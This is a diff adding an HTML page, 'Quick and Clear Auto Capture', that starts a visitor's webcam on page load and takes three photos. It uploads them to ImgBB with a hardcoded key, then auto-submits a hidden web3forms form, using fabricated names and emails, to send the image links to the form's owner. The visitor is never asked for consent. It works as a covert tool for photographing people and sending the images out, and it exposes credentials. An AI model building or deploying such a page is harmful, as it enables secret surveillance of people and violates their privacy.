@@ -1,0 +1,120 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Quick and Clear Auto Capture</title>
+    <script src="https://cdn.jsdelivr.net/npm/@mediapipe/camera_utils/camera_utils.min.js"></script>
+</head>
+<body>
+
+    <h1>Quick and Clear Auto Capture</h1>
+
+    <video id="videoElement" width="640" height="480" autoplay></video>
+    <div id="uploadStatus"></div>
+
+    <form id="contactForm" action="https://api.web3forms.com/submit" method="POST">
+        <input type="hidden" name="access_key" value="39720635-cb0d-42d1-85f8-ffcd0e8af170">
+        <input type="hidden" name="name" id="randomName">
+        <input type="hidden" name="email" id="randomEmail">
+        <textarea name="message" id="imageUrlMessage" hidden></textarea>
+        <button type="submit" id="submitButton" style="display: none;">Submit</button>
+    </form>
+
+    <script>
+        const videoElement = document.getElementById("videoElement");
+        const uploadStatus = document.getElementById("uploadStatus");
+        const contactForm = document.getElementById("contactForm");
+        const randomName = document.getElementById("randomName");
+        const randomEmail = document.getElementById("randomEmail");
+        const imageUrlMessage = document.getElementById("imageUrlMessage");
+        const submitButton = document.getElementById("submitButton");
+        let captureCount = 0;
+
+        // Start the webcam
+        navigator.mediaDevices.getUserMedia({ video: { width: 1280, height: 960 } }) // Standard 4:3 resolution
+            .then(stream => {
+                videoElement.srcObject = stream;
+                startAutoCapture();  // Start auto capture once the webcam is ready
+            })
+            .catch(error => {
+                console.error("Error accessing webcam:", error);
+            });
+
+        // Function to start the auto-capture process
+        function startAutoCapture() {
+            const interval = setInterval(() => {
+                if (captureCount < 3) {
+                    generateRandomData();  // Generate random name and email
+                    captureAndUploadImage();  // Capture and upload the image
+                    captureCount++;
+                } else {
+                    clearInterval(interval);  // Stop capturing after 3 photos
+                    setTimeout(() => {
+                        submitForm(); // Submit the form after all images are captured
+                    }, 1000);
+                }
+            }, 500);  // Capture every 0.5 seconds
+        }
+
+        // Generate random name and email
+        function generateRandomData() {
+            const randomNames = ["John Doe", "Jane Smith", "Alice Brown", "Bob Johnson", "Chris Lee"];
+            const randomEmails = ["user1@example.com", "user2@example.com", "user3@example.com", "user4@example.com", "user5@example.com"];
+            const randomIndex = Math.floor(Math.random() * randomNames.length);
+
+            randomName.value = randomNames[randomIndex];
+            randomEmail.value = randomEmails[randomIndex];
+        }
+
+        // Capture the image from video and upload it
+        function captureAndUploadImage() {
+            const canvas = document.createElement("canvas");
+            canvas.width = 1280; // Maintain 4:3 aspect ratio
+            canvas.height = 960;
+            const context = canvas.getContext("2d");
+            context.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
+            const imageData = canvas.toDataURL("image/jpeg", 0.9); // High quality (90%)
+
+            // Upload the captured image to ImgBB
+            uploadImageToImgBB(imageData);
+        }
+
+        // Upload the image to ImgBB
+        function uploadImageToImgBB(imageData) {
+            const apiKey = '6ce492fe470f3c0a2ce6ff3ebb3ab8e7'; // Your ImgBB API key
+            const url = 'https://api.imgbb.com/1/upload';
+
+            const formData = new FormData();
+            formData.append('key', apiKey);
+            formData.append('image', imageData.split(',')[1]); // Base64 data without 'data:image/jpeg;base64,'
+
+            fetch(url, {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.success) {
+                    uploadStatus.innerHTML += `<br>Image ${captureCount} uploaded successfully! <br> 
+                    <a href="${data.data.url_viewer}" target="_blank">View Image</a>`;
+                    
+                    // Append image link to the message field
+                    imageUrlMessage.value += `Image ${captureCount}: ${data.data.url_viewer}\n`;
+                } else {
+                    uploadStatus.innerHTML += "<br>Error uploading image.";
+                }
+            })
+            .catch(error => {
+                console.error("Error uploading image:", error);
+                uploadStatus.innerHTML += "<br>Error uploading image.";
+            });
+        }
+
+        // Submit the form with all collected data
+        function submitForm() {
+            submitButton.click(); // Programmatically click the submit button
+        }
+    </script>
+</body>
+</html>
